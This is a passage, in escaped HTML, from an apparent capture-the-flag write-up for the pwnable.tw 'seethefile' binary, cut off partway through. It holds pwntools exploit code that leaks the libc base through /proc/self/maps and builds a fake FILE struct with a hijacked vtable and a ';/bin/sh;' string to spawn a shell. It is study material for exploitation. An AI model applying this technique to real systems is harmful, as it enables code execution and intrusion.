  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fclose&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);
  }
  fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This closes the previously opened file.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;attacking-the-program&quot;&gt;Attacking the Program&lt;&#x2F;h1&gt;
&lt;p&gt;I will be using &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Gallopsled&#x2F;pwntools&quot;&gt;pwntools&lt;&#x2F;a&gt; to facilitate communications with the binary and the 
remote server.&lt;&#x2F;p&gt;
&lt;p&gt;To start off, we need to load the binary and the corresponding libc:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.binary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.terminal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;bin&#x2F;sh&amp;#39;

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#libc = ELF(&amp;#39;.&#x2F;libc_32.so.6&amp;#39;)                     # Remote libc
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.23.so&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Local libc

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;process(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
gdb.attach(r)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#r = remote(&amp;#39;chall.pwnable.tw&amp;#39;, 10200)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I also chose to define some helper functions to abstract communications with the binary:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;openfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(path):
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;see :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(path)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;readfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;writefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[:&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)]

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;closefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(name):
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;5&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(name)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;leaking-libc-base&quot;&gt;Leaking libc base&lt;&#x2F;h2&gt;
&lt;p&gt;If we want to get a shell, we need to know the address of &lt;code&gt;system&lt;&#x2F;code&gt; in memory. We can use the psuedo-file &lt;code&gt;&#x2F;proc&#x2F;self&#x2F;maps&lt;&#x2F;code&gt;
which contains a list of loaded memory regions of the reading process. On the remote service, we need to call &lt;code&gt;readfile&lt;&#x2F;code&gt;
twice because libc&#x27;s entry appears in the second set of 400 characters:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-seethefile&#x2F;5e8193f54304800866d69179.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This would translate to the following in the exploit script:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;openfile(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;proc&#x2F;self&#x2F;maps&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
readfile()
readfile()

libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;([x.split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;-&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;writefile().split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x.endswith(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.so&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;faking-a-file-struct&quot;&gt;Faking a FILE struct&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;choosing-the-flags&quot;&gt;Choosing the flags&lt;&#x2F;h3&gt;
&lt;p&gt;If we simply create a file struct with only &lt;code&gt;vtable&lt;&#x2F;code&gt; set, we will receive a segfault. Looking at the source code of 
&lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;libio&#x2F;oldiofclose.c#L36&quot;&gt;&lt;code&gt;fclose&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;, we see multiple fields of the 
struct being dereferenced:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;attribute_compat_text_section
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_old_fclose (_IO_FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;fp)
{
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; status;

  CHECK_FILE(fp, EOF);

  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect new streams
     here.  *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp-&amp;gt;_vtable_offset &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_new_fclose (fp);

  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* First unlink the stream.  *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp-&amp;gt;_IO_file_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_IS_FILEBUF)
    _IO_un_link ((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_FILE_plus &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) fp);

  _IO_acquire_lock (fp);
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp-&amp;gt;_IO_file_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_IS_FILEBUF)
    status &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_old_file_close_it (fp);
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;    status &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; fp-&amp;gt;_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_ERR_SEEN &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;? -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_stdin &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_stdout &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_stderr)
    {
      fp-&amp;gt;_IO_file_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);
    }

  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; status;
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can skip large chunks of this function if &lt;code&gt;_IO_IS_FILEBUF&lt;&#x2F;code&gt; is not set. Looking at the source code of libc, I found 
that the bit mask for _IO_IS_FILEBUF is &lt;code&gt;0x2000&lt;&#x2F;code&gt;. The bitwise NOT is &lt;code&gt;0xFFFFDFFF&lt;&#x2F;code&gt;, so we can set the flags of our fake 
FILE struct to that.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;bypassing-the-lock&quot;&gt;Bypassing the lock&lt;&#x2F;h3&gt;
&lt;p&gt;Another interesting macro &lt;code&gt;_IO_aquire_lock(fp)&lt;&#x2F;code&gt; is used. The 
&lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;sysdeps&#x2F;nptl&#x2F;stdio-lock.h#L29&quot;&gt;struct &lt;code&gt;_IO_lock_t&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; isn&#x27;t too complicated:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;typedef struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{ 
     &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; lock; 
     &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; cnt; 
     &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;owner;
} _IO_lock_t;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;_lock&lt;&#x2F;code&gt; is locked if &lt;code&gt;_lock-&amp;gt;cnt != 0&lt;&#x2F;code&gt;. Thus, if we set &lt;code&gt;_lock&lt;&#x2F;code&gt; to a buffer of zeroes, libc will be able to aquire the 
lock by incrementing &lt;code&gt;cnt&lt;&#x2F;code&gt;. Similarly, its counterpart, &lt;code&gt;_IO_release_lock&lt;&#x2F;code&gt; decrements &lt;code&gt;cnt&lt;&#x2F;code&gt;. A good target buffer is the 
end of the &lt;code&gt;filename&lt;&#x2F;code&gt; buffer.&lt;&#x2F;p&gt;
&lt;p&gt;We can add the following onto our exploit script:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&amp;quot;                                       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xFFFFDFFF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                         &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_flags  set _IO_IS_FILEBUF bit to false
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;;&#x2F;bin&#x2F;sh;&amp;quot;                             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;???     to be interpreted as a string

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file.ljust(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                   &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding to reach *fp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# *fp           overwrite *fp to point to the start of the name buffer
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;`&amp;#39;                                  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;filename&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_lock   vtable-&amp;gt;__dummy
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;vtable  vtable-&amp;gt;__dummy2
